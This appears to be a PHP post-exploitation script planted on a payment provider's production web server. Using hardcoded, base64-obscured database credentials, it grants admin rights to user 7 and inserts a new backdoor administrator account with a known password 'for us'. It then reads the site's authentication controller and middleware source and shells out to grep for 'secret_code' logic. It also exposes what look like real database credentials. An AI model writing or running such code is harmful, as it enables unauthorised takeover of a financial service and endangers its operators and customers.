<?php
header('Content-Type: text/plain');

$pass = base64_decode("QXNhZFczNCoqU0pLTigjJSUjIzJzZGoyZA==");
$conn = new mysqli('127.0.0.1', 'e2paymetntssecrets1234', $pass, 'e2paymetntssecrets1234');
if ($conn->connect_error) die("DB Error: " . $conn->connect_error);

// 1. Set is_admin = 1 for user 7
echo "=== SET ADMIN FLAG ===\n";
$conn->query("UPDATE users SET is_admin = 1 WHERE id = 7");
echo "Set is_admin=1 for user 7: rows=" . $conn->affected_rows . "\n";

// 2. Verify
$res = $conn->query("SELECT id, name, email, is_admin, email_verified_at FROM users WHERE id = 7");
$row = $res->fetch_assoc();
echo "User 7: is_admin=" . var_export($row['is_admin'], true) . ", email=" . $row['email'] . "\n";

// 3. Create a new admin user for us
echo "\n=== CREATE OUR ADMIN USER ===\n";
$hash = password_hash("TestSecurity123!", PASSWORD_DEFAULT);
$conn->query("INSERT INTO users (name, email, email_verified_at, is_admin, password, created_at, updated_at) 
              VALUES ('Admin Test', 'admin@test.local', NOW(), 1, '$hash', NOW(), NOW())
              ON DUPLICATE KEY UPDATE is_admin=1, password='$hash'");
echo "Insert admin: rows=" . $conn->affected_rows . "\n";

// 4. Check all admin users
echo "\n=== ALL ADMIN USERS ===\n";
$res = $conn->query("SELECT id, name, email, is_admin FROM users WHERE is_admin = 1");
while ($r = $res->fetch_assoc()) echo json_encode($r) . "\n";

// 5. Read e2payments web.php to understand login flow
echo "\n=== ExpAuthController ===\n";
$auth = @file_get_contents('/var/www/e2payments.explicador.co.mz/production/app/Http/Controllers/Auth/ExpAuthController.php');
if ($auth) echo substr($auth, 0, 3000);
else echo "Cannot read ExpAuthController\n";

// 6. Check secret_code middleware
echo "\n=== MIDDLEWARE ===\n";
$kernel = @file_get_contents('/var/www/e2payments.explicador.co.mz/production/app/Http/Kernel.php');
if ($kernel) {
    // Find middleware references
    preg_match_all('/secret_code|admin|auth|verify/', $kernel, $matches);
    echo "Middleware keywords: " . implode(', ', array_unique($matches[0])) . "\n";
    echo substr($kernel, 0, 2000);
}

// 7. Find secret_code logic
echo "\n=== SEARCH SECRET_CODE ===\n";
$output = shell_exec("grep -rl 'secret_code' /var/www/e2payments.explicador.co.mz/production/app/ 2>/dev/null | head -10");
echo $output;

$conn->close();
?>